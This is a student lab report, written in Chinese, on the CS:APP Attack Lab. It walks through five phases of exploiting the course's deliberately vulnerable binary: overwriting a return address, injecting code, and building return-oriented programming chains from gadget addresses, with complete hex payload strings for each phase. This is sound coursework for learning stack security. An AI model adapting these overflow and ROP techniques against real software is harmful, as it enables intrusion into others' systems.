# Report for Attack Lab
## 实验目的
1.学习简单的程序攻击方法。
2.理解如何写出更为安全的程序。
3.深入理解x86-64架构的机器码和栈空间机制。
4.学习使用调试工具，例如gdb和objdump。
## 实验内容
### phase1
首先执行``objdump -d ctarget ctarget.d``，获得并观察ctarget.d。不难发现程序为输入准备了24字节：
```401e70:	48 83 ec 18          	sub    $0x18,%rsp```
可以通过输入超过24个字节的内容篡改ret时返回的地址，使得程序进入我们设定的一个函数。
```
0000000000401e86 <touch1>:
  401e86:	f3 0f 1e fa          	endbr64
...
  401fda:	c3                   	ret
```
查找可以发现touch1的地址为``0x401e86``，但是直接填入会出现``%rsp``没有16字节对齐的问题，所以先找到一个ret的地址``0x401fda``填入，然后将touch1的地址填入栈的上一位实现跳转。
最终进行对齐，得到答案：
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
da 1f 40 00 00 00 00 00 # ret
86 1e 40 00 00 00 00 00 # touch1
00 00 00 00 00 00 00 00 # align
```

### phase2
首先对touch2进行简单的分析：
```
0000000000401eba <touch2>:
  401eba:	f3 0f 1e fa          	endbr64
  ...
  401ed0:	39 3d 5a 46 00 00    	cmp    %edi,0x465a(%rip)        # 406530 <cookie>
  401ed6:	74 2a                	je     401f02 <touch2+0x48>
```
touch2需要对传入参数进行校验，但是传入参数在寄存器上，因此我们需要使用CI攻击。首先使用gdb调试找到``getbuf``调用后到``sub $0x18``的栈顶指针地址``0x55620020``，在返回时跳转到该地址执行指令。
然后对CI内容进行设计。我们已知cookie为``0x2283199d``，将其移入``%rdi``，然后由于直接push touch2的地址会导致对齐问题，所以先push一个ret指令的地址（``0x401e85``），然后ret后栈地址增加，调用touch2（``0x401eba``）。
```
   0:	48 c7 c7 9d 19 83 22 	mov    $0x2283199d,%rdi
   7:	68 85 1e 40 00       	push   $0x401e85
   c:	c3                   	ret
```
最终进行对齐，得到答案：
```
48 c7 c7 9d 19 83 22 68 # CI
85 1e 40 00 c3 00 00 00 # CI
00 00 00 00 00 00 00 00
20 00 62 55 00 00 00 00 # %rsp - 0x18
ba 1e 40 00 00 00 00 00 # touch2
00 00 00 00 00 00 00 00 # align
```

### phase3
首先对touch3进行简单的分析：
```
0000000000401fe0 <touch3>:
  401fe0:	f3 0f 1e fa          	endbr64
  ...
  401ffb:	e8 24 ff ff ff       	call   401f24 <hexmatch>
```
发现``touch3``的核心是调用了hexmatch
```C
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val,char *sval)
{
    charcbuf[110];
    /* Make position of check string unpredictable */
    char *s=cbuf+random()%100;
    sprintf(s,"%.8x",val);
    return strncmp(sval,s,9)==0;
}
```
不难发现，只要传入的``val``和``*sval``内容相同就可以通过验证。其中``val == cookie == 0x2283199d``，由于比较内容时为进行字符匹配，所以进行ASCII转换，得到``32 32 38 33 31 39 39 64``。所以我们要把该内容放在某一位置，然后传入该位置的指针。由于栈顶指针与phase2相同，我们可以愉快的进行所有同样的操作。
（以下内容为最终结果，在此处仅作演示）
```
   0:	48 c7 c7 50 00 62 55	mov    $0x55620050,%rdi
   7:	68 85 1e 40 00       	push   $0x401e85
   c:	c3                   	ret
```
但是当时的输入并不能成功，经过gdb调试发现，部分栈中内容在运行过程中会被覆盖，导致我们预留的内容丢失，需要我们进行一定的留空避免被覆盖。
最终进行对齐，得到答案：
```
48 c7 c7 50 00 62 55 68 # CI
85 1e 40 00 c3 00 00 00 # CI
00 00 00 00 00 00 00 00
20 00 62 55 00 00 00 00 # %rsp - 0x18
e0 1f 40 00 00 00 00 00 # touch3
00 00 00 00 00 00 00 00
32 32 38 33 31 39 39 64 # ACSII of cookie
00 00 00 00 00 00 00 00 # align
```

### phase4
由于CI的方法被禁止了，我们需要从farm中找到一些指令片段进行攻击。由于该实验只允许使用``popq``指令将栈中内容传递到寄存器中，且ROP使用范围限制在farm中，我们需要在farm中找到所有可能用到的内容。
首先需要找到``popq``传入cookie，寻找``5[89a~f]``的内容，发现只有``58``
```
  4020a8:	8d 87 58 90 c3 e7    	lea    -0x183c6fa8(%rdi),%eax
```
其后紧跟的``90``为NOP，并且立即返回（``c3``），可用，因此填入``0x4020aa``和cookie ``0x2283199d``。
但是传参需要用``%rdi``，因此查找``48 89 c7``，刚好有，且其后紧跟``c3``可用。
```
  40209e:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
```
最终进入touch2函数，并进行对齐，得到答案：
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
aa 20 40 00 00 00 00 00 # pop %rax
9d 19 83 22 00 00 00 00 # cookie
a0 20 40 00 00 00 00 00 # movq %rax,%rdi
ba 1e 40 00 00 00 00 00 # touch2
00 00 00 00 00 00 00 00 # align
```

### phase5
phase5分明与phase3的实现思路一模一样，但是由于栈顶地址每次运行时都不一样，因此只能假道伐虢：虽然最终的存放cookie的地址我们找不到，但是我们能够获得现在的栈顶指针地址，并且我们知道栈顶指针到存放地址的偏移量，进行加法运算即可。
首先保存栈顶指针地址，查找``48 89 e[0~7]``
```
  40213c:	8d 87 48 89 e0 c3    	lea    -0x3c1f76b8(%rdi),%eax
```
可用。填入``0x40213e``，现在存在``%rax``。但是``%rax``会在``popq``中使用，因此得移动到别的地方去（等待后续修改）。
然后继续使用``popq``：
```
  4020a8:	8d 87 58 90 c3 e7    	lea    -0x183c6fa8(%rdi),%eax
```
``0x4020aa``
问题是如何进行加法运算呢？进行一些漫长的寻找，发现为我们准备了一个过分漂亮的片段：
```
00000000004020ef <add_xy>:
  4020ef:	f3 0f 1e fa          	endbr64
  4020f3:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4020f7:	c3                   	ret
```
我们不得不使用它：``0x4020f3``，接下来的工作就是把两个``%rax``中的内容有序地放入``%rdi``和``rsi``中。用类似的思路进行查找。
```
  402093:	c7 07 f8 48 89 c7    	movl   $0xc78948f8,(%rdi)
  ...
  40215d:	8d 87 89 c1 90 c3    	lea    -0x3c6f3e77(%rdi),%eax
  ...
  40219d:	c7 07 89 ca 38 d2    	movl   $0xd238ca89,(%rdi)
  4021a3:	c3                   	ret
  ...
  4021c9:	8d 87 89 d6 90 90    	lea    -0x6f6f2977(%rdi),%eax
  4021cf:	c3                   	ret
```
由于诸如``90``、``38 d2``不会更改我们涉及到的寄存器，且由于传递的内容只有4字节，``movl``同样可以使用，我们最终可以得到一系列可用的地址：``0x402096``、``0x40215f``、``0x40219f``、``0x4021cb``。最后记得用``movq``将``%rax``的内容移动到``%rdi``即可。
最后进入touch3，存放ASCII码，并在此时算出地址偏移量``0x48``填入前面预留的位置就可以大功告成了。
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
3e 21 40 00 00 00 00 00 # movq %rsp,%rax
96 20 40 00 00 00 00 00 # movq %rax,%rdi
aa 20 40 00 00 00 00 00 # popq %rax
48 00 00 00 00 00 00 00 # address offset
5f 21 40 00 00 00 00 00 # movl %eax,%ecx
9f 21 40 00 00 00 00 00 # movl %ecx %edx
cb 21 40 00 00 00 00 00 # movl %edx %esi
f3 20 40 00 00 00 00 00 # lea  (%rdi,%rsi,1),%rax
96 20 40 00 00 00 00 00 # movq %rax %rdi
e0 1f 40 00 00 00 00 00 # touch3
32 32 38 33 31 39 39 64 # ASCII of cookie
```

## 实验总结
1.实验其实没有在栈内填入过多内容产生某些影响方面进行限制。
2.``add_xy``函数过于“巧合”了，其实不太好。
3.实验内容隐藏了大量的试错过程，整个实验是非常痛苦的，但是做完的确是收获颇多。
4.用AI无法完成次作业。

## 参考文献
1.Arthal, 更适合北大宝宝体质的 Attack Lab 踩坑记, 2025/10/19, https://arthals.ink/blog/attack-lab.